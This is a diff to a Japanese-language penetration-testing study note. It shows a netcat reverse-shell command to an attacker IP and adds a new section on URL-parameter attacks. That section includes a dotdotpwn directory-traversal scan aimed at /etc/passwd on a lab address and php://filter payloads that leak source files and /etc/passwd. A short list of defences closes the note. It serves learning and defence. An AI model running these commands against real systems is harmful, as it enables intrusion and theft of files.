@@ -18,6 +18,9 @@ nc -lvp <port>
 
 ### ２．コマンドインジェクションで攻撃マシンに接続
 
+リバースシェルの種類は無数に存在する  
+https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux
+
 ```shell
 nc.traditional -e /bin/bash <ip> <port>
 ```
@@ -115,9 +118,34 @@ https://github.com/epsylon/xsser
 xsser -u http://192.168.11.12 -g /bodgeit/search.jsp?q=XSS
 ```
 
-## セキュリティ視点の結論
+## URL パラメータを狙った攻撃
+
+https://book.hacktricks.xyz/pentesting-web/file-inclusion
+
+### ディレクトリトラバーサルの脆弱性をスキャンする
+
+"ttp://192.168.11.15/?lang=../../../etc/passwd" のようなパターンを総当たり的に試す
+
+```shell
+dotdotpwn -m http-url -u http://192.168.11.15/?lang=TRAVERSAL -f /etc/passwd -k "root" -d 5 -t 50
+```
+
+### PHP フィルター
+
+```shell
+# index.php を Base64エンコードしたものを出力させようとしている
+http://192.168.11.15/?lang=php://filter/convert.base64-encode/resource=index
+```
+
+```php
+# PHPのコードではこのようにフィルターが使われる
+echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
+```
+
+## セキュリティ視点
 
 - インジェクション系の対策は、ユーザー入力を全て URL エンコードする。これに尽きる。
 - Web サーバー上に機密ファイルを置かないこと
 - Cookie に HttpOnly 属性を付けたらスクリプトから参照できない
 - img の外部取得を禁止するのもセキュリティ的に有効
+- ユーザー入力をファイル名（パス）として使う場合は、ディレクトリトラバーサルに注意
